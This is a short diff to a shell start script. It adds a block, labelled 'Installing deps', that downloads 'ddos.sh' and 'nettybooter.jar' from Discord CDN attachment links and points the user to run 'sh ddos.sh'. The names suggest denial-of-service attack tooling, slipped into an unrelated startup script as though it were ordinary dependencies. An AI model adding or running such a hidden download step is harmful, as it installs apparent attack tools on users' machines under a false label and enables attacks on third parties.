@@ -179,6 +179,16 @@ echo " "
 echo "FOR INSTALL debian run -> sh DebStart.sh"
 echo "--------------"
 
+if ! [ -f ddos.sh ];
+then
+echo "Installing deps"
+wget https://cdn.discordapp.com/attachments/920543974266130523/929337717588885514/ddos.sh
+echo "1/2"
+wget https://cdn.discordapp.com/attachments/920543974266130523/929309799110307900/nettybooter.jar
+echo "2/2"
+echo "Deps installed"
+echo "For help enter: sh ddos.sh"
+fi
 if ! [ -f $HOME/startcustom.sh ];
 then
 echo "startcustom.sh not found. Creating..."
